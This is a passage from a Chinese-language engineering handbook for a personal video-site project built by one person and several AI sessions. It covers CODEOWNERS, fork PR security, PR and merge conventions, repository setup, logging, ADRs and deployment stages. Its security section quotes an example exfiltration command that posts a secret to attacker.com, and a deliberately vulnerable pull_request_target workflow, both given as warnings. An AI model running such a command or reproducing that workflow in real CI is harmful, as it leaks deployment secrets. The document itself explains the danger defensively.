规则 2 的实现难点是「如何知道文件在 main 上已存在」：CI 里 `git diff --name-status origin/main...HEAD`，取 `M`（修改）的迁移文件即为违规。

**必须承认的空白**：以上所有检查都**测不出「体验问题」**（弹幕重叠、卡片在某个断点错位、加载态闪一下）。这类问题只能靠浏览器验收，见第 7.6 节的「验收项」约定。

### 7.4 CODEOWNERS 与所有权矩阵的对应

`.github/CODEOWNERS`（或 `CODEOWNERS` 在根目录）：

```
# 共享层：只能由 owner 合并
/prisma/                 @your-account
/src/lib/                @your-account
/src/app/layout.tsx      @your-account
/src/app/globals.css     @your-account
/package.json            @your-account
/package-lock.json       @your-account
/next.config.ts          @your-account
/tsconfig.json           @your-account
/.github/                @your-account

# 业务模块：可以按执行者拆分（个人项目里通常也是同一个 owner）
/src/app/watch/          @your-account
/src/components/Player.tsx @your-account
```

配套必须打开 **`Require review from Code Owners`**，否则 CODEOWNERS 只是一份注释。

**CODEOWNERS 的边界**：
- 它限制的是「合并」，不是「修改」。执行者仍然可以改这些文件（在自己的分支上），只是无法合并进 main。所以它是**门禁，不是锁**。
- 它解决不了语义冲突（A 改 schema、B 改查询），那一层要靠契约检查和评审。
- 对 fork 来的 PR，CODEOWNERS 依然生效（因为合并动作发生在上游仓库）。

**和所有权矩阵的映射原则**：矩阵里的「共享层（串行）」= CODEOWNERS 里的独占路径；矩阵里的「模块」= 可以分给不同 owner 的路径。**两者必须一一对应**，否则会出现「矩阵说不能并行改，但 Git 允许合并」的漏洞。

### 7.5 Fork PR 的安全边界

**为什么 fork PR 拿不到密钥**：

GitHub 对来自 fork 的 PR，默认**不注入仓库 secrets**，且 `GITHUB_TOKEN` 是只读的。原因是：fork 的作者可以在 PR 里修改 CI 配置文件，如果 secrets 可用，他就能加一行 `curl -d "$SECRET" attacker.com`，直接偷走你的部署密钥。

**`pull_request_target` 的风险**：

这个事件让工作流在**上游仓库的上下文**中运行（有 secrets、有写权限），同时 PR 的代码会被检出。听起来很方便（「我要给 fork PR 跑需要密钥的检查」），但它是一个经典漏洞：

```
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # ← 检出不可信代码
      - run: npm ci && npm test                                     # ← 执行不可信代码，此时 secrets 可用
```

攻击者只需在 `package.json` 的 `postinstall` 里加一行，就能拿到你的全部 secrets。**规则：永远不要在 `pull_request_target` 里检出并执行 fork 的代码。** 如果必须用，只能做「只读元数据」的操作（打标签、评论），且绝不 checkout PR head。

**外部 AI 应该拿什么权限**：

| 场景 | 给的权限 | 不该给 |
| --- | --- | --- |
| 外部 AI 只提 PR | fork + 无仓库权限；或 repo 的 `triage`/`read` | `write`（能直接推 main）、`admin` |
| 内部 AI 会话（你自己的机器） | 直接给 repo write，但 main 受保护 | 绕过保护的权限 |
| 需要跑 CI 的 fork PR | 让维护者在合并前用一个「可信分支」重跑（`git fetch` PR 到自己仓库的分支再 push） | 在 fork PR 上注入 secrets |
| 部署凭据 | 只放在部署环境的 secrets 里，且只给「部署」这一步用 | 全局环境变量、写进 `.env` 提交 |

**额外提醒**：fork PR 的 CI 默认不跑，所以「CI 绿」不代表 fork 的代码跑过。合并前必须由维护者在自己仓库里重跑一次。

### 7.6 分支与提交约定

**一卡一 PR（one card, one PR）**：一个 PR 只对应一件可验收的事。理由：

- 出问题时能精确回滚，而不是「回滚整个大 PR」；
- 评审时能一次看懂（超过 ~400 行 diff，人的注意力就断了，AI 评审也一样）；
- 冲突范围小（碰的文件少）。

**分支命名**：`feat/danmaku-lane-5`、`fix/feed-cursor`、`chore/deps-bump`、`docs/handbook`。前缀决定评审关注点，不是形式主义。

**PR 描述必须包含**（模板可自动化检查是否为空）：

```markdown
## 目标
一句话：这个 PR 让用户/开发者能做什么。（例：让播放页在切换清晰度时保留播放进度）

## 改动范围
- 涉及文件/目录（必须列出共享层文件：schema、lib、layout、package.json）
- 是否改契约：接口字段 / DB 字段 / 共用类型（有则列出旧→新）

## 验收项
- [ ] 具体可观察的行为 1（例：720p→480p 后时间点偏差 < 1s）
- [ ] 具体可观察的行为 2

## 风险与回滚
- 可能的破坏点（例：老数据没有 coverUrl 会导致卡片空白）
- 回滚方式（revert 这个 commit 即可 / 需要数据修复）
```

**合并策略怎么选**：

| 策略 | 结果 | 适合 | 代价 |
| --- | --- | --- | --- |
| **Squash and merge** | 一个 PR 变成 main 上一个 commit | 个人项目、PR 内提交较乱 | 丢失 PR 内的细分历史；多个执行者无法在 main 上看到「哪一步引入了问题」 |
| **Rebase and merge** | 保留每个 commit，线性历史 | 提交本身整洁、想保留粒度 | 要求每个 commit 都能独立构建通过 |
| **Merge commit** | 保留分叉 | 多人长期分支、需要在图上看出「什么时候合的」 | 历史噪音大，`git log --oneline` 很快不可读 |

**本项目建议**：squash。理由：单人 + AI 并行时，PR 内的提交往往是「改了一版又改回去」，保留它们没有价值；而每个 PR 对应一个可回滚的单元，这个价值更大。**什么条件下改**：如果某个 PR 包含两个逻辑上独立、可能单独回滚的改动，就应该拆成两个 PR，而不是靠保留 commit 粒度。

**无人值守时评审怎么替代**：

人在场时，评审做三件事：判断意图、发现副作用、把关风格。没有人在场时，分别用：

| 评审职责 | 替代手段 | 局限 |
| --- | --- | --- |
| 意图是否正确 | PR 描述里的「目标 + 验收项」，由提出需求的人（你）确认 | 需求本身写错了，自动化救不了 |
| 有没有副作用 | CI（类型/构建/测试）+ 契约 diff + 浏览器验收 | 测不到「看起来对但体验差」 |
| 风格一致 | lint + prettier + 目录约定 | 架构层面的不一致（例如两套分页方式）仍需人工定 |

**一条实用约定**：让 AI 在 PR 里**自己跑一遍验收**并把结果贴进描述（截图/命令输出）。这不能证明它没撒谎，但能让「声称完成」变成「可核对」。

### 7.7 多机器同步

**唯一原则：只在 Git 层同步，不要共享工作目录。**

不要用 iCloud/Dropbox/网盘同步项目目录：`node_modules` 里的符号链接和权限会坏，`.git/index` 并发写会直接损坏仓库，而且冲突文件（`xxx (1).ts`）会混进代码。

**换行符**：仓库根放 `.gitattributes`：

```
* text=auto eol=lf
*.sh text eol=lf
*.png binary
*.mp4 binary
*.jpg binary
```

否则 Windows 参与时整个文件都会显示为修改，`git blame` 失效。

**文件权限**：`scripts/*.sh` 需要可执行位：

```
*.sh text eol=lf
```

并在仓库里 `git update-index --chmod=+x scripts/make-sample-media.sh`（否则 Linux 上 `Permission denied`）。或者始终用 `bash scripts/xxx.sh` 调用，绕开这个问题。

**锁文件必须提交**：`package-lock.json` 是「同一份依赖树」的唯一保证。不提交的后果是每台机器解析出不同的小版本，出现「A 机器能跑，B 机器报错」。冲突时**不要手工合并**，正确做法是：`git checkout --theirs package-lock.json && npm install`（以一方为基础重新解析），并在 PR 里说明。

**大文件不要用 Git LFS**，理由：

- LFS 只是把大文件存在另一个地方，**克隆时依然要下载全部历史版本**（除非用 `--filter`），仓库会越来越重；
- LFS 有单独的配额与计费，且自建 LFS 服务要额外维护；
- 视频文件是**运行时数据**，不是源码。它属于对象存储/备份策略，不属于版本控制。

正确做法：`storage/`、`*.mp4`、`*.db` 全部进 `.gitignore`；示例媒体用脚本生成（`scripts/make-sample-media.sh`），因为「生成规则」才是应该版本化的东西——这也是本项目示例视频用 ffmpeg 合成而不是塞进仓库的原因。

**每台机器的首次准备**：`scripts/bootstrap.sh`（第 6.4 节），而不是靠记忆敲命令。

### 7.8 仓库初始化检查清单

从建仓到第一条保护规则生效，按顺序做：

**建仓阶段**
- [ ] 创建仓库，选择 **Private**（自用项目没有公开的必要，公开会把漏洞暴露给扫描器）
- [ ] 本地 `git init` → 首次提交前确认 `.gitignore` 已排除 `node_modules/`、`.next/`、`.env`、`storage/`、`prisma/dev.db`
- [ ] 添加 `.gitattributes`（换行符 + 二进制标记 + `*.sh eol=lf`）
- [ ] 提交 `package-lock.json`（不要 gitignore 它）
- [ ] 添加 `.env.example`（只放键名和示例值，绝不放真实密钥）

**协作文件**
- [ ] `.github/CODEOWNERS`：共享层路径指向 owner（第 7.4 节）
- [ ] `.github/pull_request_template.md`：目标/改动范围/验收项/风险四段（第 7.6 节）
- [ ] `.github/workflows/ci.yml`：
  - `npm ci`
  - `npx tsc --noEmit`
  - `npm run lint`
  - `npm run build`
  - `npx prisma migrate diff ... --exit-code`（迁移缺失检查）
  - `bash scripts/check-migrations.sh`（线性与不可改检查）
- [ ] `scripts/check-migrations.sh`：规则 1/2/3（第 7.3 节）
- [ ] `docs/adr/0001-*.md` 起头（第 9 节）
- [ ] `docs/discussion-log.md`（可选）：讨论结论的落点，防止「说过但没记」

**平台开关（GitHub 为例）**
- [ ] Settings → Branches → 保护 `main`：
  - [ ] Require a pull request before merging（approvals = 1）
  - [ ] Require review from Code Owners
  - [ ] Require status checks（选中 CI 的 job 名）
  - [ ] Require branches to be up to date before merging
  - [ ] Do not allow bypassing the above settings
  - [ ] Restrict force pushes / deletions
- [ ] Settings → Actions → Fork pull request workflows：保持默认「需要批准」（不要放开）
- [ ] Settings → Secrets：只放部署所需，按环境（Environment）隔离
- [ ] 邀请协作者时给 `write`，不给 `admin`；外部 AI 用 fork 模式

**第一次提交后验证**
- [ ] 直接 `git push origin main` 应被拒绝
- [ ] 提一个故意改坏类型的 PR，CI 应红
- [ ] 提一个只改 `schema.prisma` 不改迁移的 PR，迁移检查应红
- [ ] 合并后 `main` 上跑一次 `npm run setup && npm run build` 应通过

### 7.9 冲突发生时怎么处理

1. **先判断类型**：锁文件/生成物（重新生成，不手改）、样式（手工解，注意两边都要）、迁移（**不要手工合并**，删掉自己的迁移重新生成，或与对方协商顺序）。
2. **迁移冲突的唯一正确解法**：保留 main 上已有的，把自己的改动重新生成一个新迁移（时间戳更新），然后 `db push` 校验。
3. **合并后必须验证**：冲突解决完的代码「看起来对」不代表能跑。最低要求 `npm ci && npx tsc --noEmit && npm run build`，涉及数据层的再加一次 `prisma migrate reset` + seed。
4. **合并后破坏的排查顺序**：先看契约（schema/接口），再看查询，最后看 UI。多数「合并后白屏」都是「契约变了但消费方没改」。

## 8. 可观测性

### 8.1 为什么多机之后它变成必需品

单机时，出问题你可以 `ssh` 上去 `tail -f`。多机时：

- 日志分散在 N 台机器，你不知道用户那次请求落在哪台；
- 时间不同步（容器时钟漂移、时区不同），按时间对日志会错位；
- 问题无法复现：用户说「刚才打不开」，而那一刻的机器已经被重启或滚掉了；
- 队列里的任务失败了，没人知道——**静默失败是异步系统最典型的故障**。

没有可观测性时，你的排查方式是「猜 + 重启」，这两件事都会让问题更糟。

### 8.2 结构化日志

**做**：输出 JSON 行，关键字段固定：

```json
{"ts":"2026-11-10T13:44:10.982Z","level":"error","msg":"transcode failed","requestId":"01J...","videoId":"cmwa...","stage":"720p","code":1,"err":"Invalid data found when processing input"}
```

**不做**：`console.log("转码失败 " + JSON.stringify(err) + " 视频 " + id)`。这种日志人能读，机器不能聚合，也无法按字段过滤。

**字段约定**（写进 README 或 ADR，避免各写各的）：
- `ts` ISO8601 + UTC；
- `level`：`debug/info/warn/error`；
- `requestId`：贯穿一次请求；
- `userId`（有则带，注意不要带邮箱等 PII）；
- `event`：稳定的事件名（`video.upload.completed`），比自由文本更适合做统计；
- `err`：错误消息，附 `code`，不带堆栈到生产（或单独字段）。

### 8.3 请求 id 贯穿

做法：入口（路由处理器/中间件）生成 `requestId`（或读取上游传入的 `x-request-id`），放进 `AsyncLocalStorage`，日志函数自动带上。

为什么必须：多机 + 异步之后，「一个用户请求」可能触发 3 个后台任务。没有 requestId，你无法把这些日志串起来。

**反例**：只在 HTTP 层打日志，转码 worker 的日志不带 requestId。用户报「我上传的视频没出来」，你只能按时间猜是哪一个。

### 8.4 关键指标（够用就好）

| 类别 | 指标 | 为什么 |
| --- | --- | --- |
| 请求 | 总数、错误率（5xx 占比）、p95 延迟 | 判断「站挂了没」 |
| 队列 | 待处理任务数、最老任务等待时长、失败数 | 队列积压是最早的故障信号 |
| 转码 | 单任务耗时、失败原因分布 | 区分「机器慢」和「文件有问题」 |
| 存储 | `storage/` 目录大小、单文件大小 Top10 | 磁盘满是最常见的一类「突然全站 500」 |
| 数据库 | 连接数、慢查询 | SQLite/PG 都会在并发高时暴露 |
| 业务 | 上传数、播放数、评论数（按天） | 判断「是不是没人用」而不是「是不是坏了」 |

**不要一开始就上 Prometheus + Grafana**。个人项目的过渡方案：一个 `/api/health` 返回「数据库可读 + 队列长度 + 磁盘剩余」，用 `cron` 每分钟 curl 一次，异常就发一条消息给自己。等有了第二台机器再加真正的指标系统。

### 8.5 日志落哪

- 容器里：输出到 stdout，由 Docker 的日志驱动管理（注意配置 `max-size`，否则日志能把磁盘写满——这是很常见的「磁盘突然满」的原因）。
- 单机不用容器：文件 + `logrotate`。
- 多机：至少要做到「按 requestId 能搜到」，方式可以是集中到一台机器的 `loki`/`vector`，或者简单地定时 `rsync` 日志到一台机器。

## 9. ADR（架构决策记录）

### 9.1 为什么多执行者场景下必须写

ADR 记录的不是「做了什么」，而是**「为什么这么做、当时排除了什么、什么条件下会改」**。

多执行者场景的特殊性在于：**执行会话没有记忆**。你今天和会话 A 讨论出「先用 SQLite」，三天后会话 B 会真诚地问「为什么不用 PostgreSQL」，然后可能直接改掉。ADR 是唯一能把「为什么」跨会话传递下去的载体。

它也是**防止重复讨论**的工具：一个已经被否决的方案，如果不记录否决理由，两周后会有人（或某个 AI）再提一次，你们再吵一遍。

### 9.2 格式与存放

`docs/adr/NNNN-kebab-title.md`，编号递增，永不删除、永不修改内容（只能新增「状态变更」或写一份新的 supersede 它）。

```markdown
# ADR 0003：转码在请求内同步执行（临时决定）

- 状态：已接受（临时）
- 日期：2026-11-10
- 决策者：项目所有者

## 背景
个人项目，每天投稿 1–2 个，单个文件 < 200MB。当前只有一台机器，
引入 Redis + worker 会增加一个常驻进程和一套失败处理逻辑。

## 决策
上传接口内同步调用 ffmpeg，转码完成才返回响应。
ffmpeg 不存在时降级为「只保留原片」。

## 后果
- 正面：无额外组件，部署只有一个进程；失败即报错，用户立刻知道。
- 负面：请求可能持续数十秒；并发上传会互相阻塞；用户关闭页面可能中断。
- 触发改变的条件：单文件超过 2 分钟，或出现并发投稿，或需要多机部署。
  届时按本文件「迁移到队列的最小改动」执行，并写 ADR 0007 取代本文件。

## 备选方案
1. Redis + BullMQ（成本：多一个组件；收益：解耦）→ 暂不选，理由见上。
2. 云函数转码（成本：云厂商绑定 + 冷启动；收益：免运维）→ 数据要出境/出网，暂不选。
```

### 9.3 什么该写、什么不该写

**该写**：
- 选型（数据库、存储、队列、框架）；
- 边界（哪些模块允许直接访问数据库）；
- 有意为之的「技术债」（同步转码、只做两级评论）；
- 推翻旧决策（必须写新的，说明为什么旧的失效）。

**不该写**：
- 代码怎么写（那是代码注释和 PR 的事）；
- 一次性操作（怎么装依赖）；
- 没有备选方案的「记录」（那不是决策，是日志）。

**判断标准**：如果三个月后的你（或另一个 AI）看到这段代码会问「为什么不用 X」，就值得写一条 ADR。

### 9.4 本项目的三条起步 ADR（建议现在就写）

## 10. 部署演进路径

每一步都标注：**触发条件**（什么时候该走）、**新增运维负担**（你会多出哪些活）、**回滚方式**。不要跳步——跳步的代价通常在下一次故障时才结算。

### 阶段 0：本地开发（当前）

- 形态：`npm run dev`，SQLite，本地磁盘。
- 触发进入下一阶段：想在其他设备访问。
- 运维负担：只备份 `dev.db` + `storage/`。

### 阶段 1：单机常驻（`npm run build && npm run start` + systemd/Caddy）

- 新增：进程守护（崩了自动拉起）、反向代理、HTTPS 证书续期、日志轮转、磁盘监控。
- **新增的活**：证书过期是第一大「网站突然打不开」的原因；磁盘满是第二大。
- 回滚：`git checkout <上一个 tag>` + 重启。
- 触发进入下一阶段：这台机器扛不住，或你不想让它一直开着。

### 阶段 2：单机 Docker Compose（应用 + PG + Redis + worker + Caddy）

- 触发条件：转码开始影响页面响应；或想用 PG 做一些 SQLite 做不了的事。
- 新增负担：镜像构建与推送、compose 配置管理、数据卷备份（**卷里的 PG 数据必须单独备份，重建容器不会保留它**）、容器日志大小限制。
- 回滚：`docker compose up -d` 切回上一个镜像 tag（镜像要打 tag，不要只用 `latest`）。
- 这是**个人项目的合理终点**。大多数自用视频站不需要超过这一阶段。

### 阶段 3：对象存储 + CDN

- 触发条件：磁盘 > 60%，或需要多机，或外网访问速度不可接受。
- 新增负担：云凭据管理（不要写进镜像）、存储费用监控、CORS 与签名 URL、**删除稿件时要同时删存储对象**（否则产生「孤儿文件」，账单慢慢涨）。
- 回滚：URL 前缀切回 `/media`（代码里只改一个常量，这是当初把存储访问收敛到 `src/lib/media.ts` 的原因）。

### 阶段 4：应用多副本 + 负载均衡

- 触发条件：单机 CPU 长期高，或需要滚动发布不中断。
- 前置条件（缺一不可）：会话在 DB/Redis、文件在对象存储、没有进程内缓存/定时任务、健康检查端点。
- 新增负担：负载均衡配置、健康检查、发布顺序（先起新副本再停旧）、多副本下的日志聚合。
- 回滚：负载均衡切回旧副本组。

### 阶段 5：托管数据库 + 备份演练

- 触发条件：数据重要到不能丢；或需要自动故障转移。
- 新增负担：连接池（多副本 × 连接数容易打满）、迁移窗口（迁移期间不能有旧代码写入不兼容数据）、**定期做恢复演练**（没演练过的备份等于没有备份）。
- 回滚：从备份恢复 = 丢失恢复点之后的数据，所以迁移必须先向后兼容（加字段 → 双写 → 切读 → 删旧字段）。

### 一张速查表

| 阶段 | 触发条件 | 新增负担 | 主要风险 |
| --- | --- | --- | --- |
| 0 本地 | 开始写代码 | 无 | 数据只在本地 |
| 1 单机常驻 | 想在别的设备看 | 证书、日志、磁盘 | 证书过期 / 磁盘满 |
| 2 Compose | 转码影响页面 / 要 PG | 镜像、卷备份 | 卷丢失 / 镜像回滚 |
| 3 对象存储 | 磁盘 60% / 多机 | 云凭据、费用、孤儿文件 | 权限泄露 / 账单 |
| 4 多副本 | CPU 瓶颈 / 零停机 | LB、日志聚合 | 隐藏状态导致随机故障 |
| 5 托管库 | 数据不能丢 | 连接池、迁移窗口、演练 | 恢复点丢失 |

## 11. 如果只能记住三件事

### 一、契约是唯一真相；改契约等于同时改所有消费方

数据库 schema、接口结构、共用类型，各只能有一个源头，其他地方派生或由机器检查。任何「复制一份」的契约都会漂移，而漂移的表现通常不是报错，是**数据静默出错**（单位不一致、状态值不匹配、空值被当成空字符串）。

讨论时可以用这个问句检验：「这个字段，除了这里，还有几个地方各自写着它的形状？」

### 二、状态只有三个合法位置：数据库、对象存储、用户的浏览器；不在某个进程的内存里

会话、文件、任务、缓存，都要么在共享存储里，要么在客户端。放在进程内存或本地磁盘的状态，会在重启、扩容、换机器时变成随机故障——而随机故障是最难排查的一类。

检验问句：「如果这个进程现在被杀掉，在另一台机器上重启，用户会看到什么不一致？」

### 三、并行靠所有权与自动化，不靠沟通记忆

多个执行者同时改代码时，冲突不会因为「说好了」而消失。真正起作用的是三样东西：按路径划分的所有权（CODEOWNERS）、合并前的自动化检查（类型/构建/迁移/契约 diff）、以及记录「为什么」的 ADR。

检验问句：「一个新加入的执行者，不看聊天记录，只读仓库，能不能知道哪些文件不能碰、改完要过哪些检查、为什么当初这样选？」
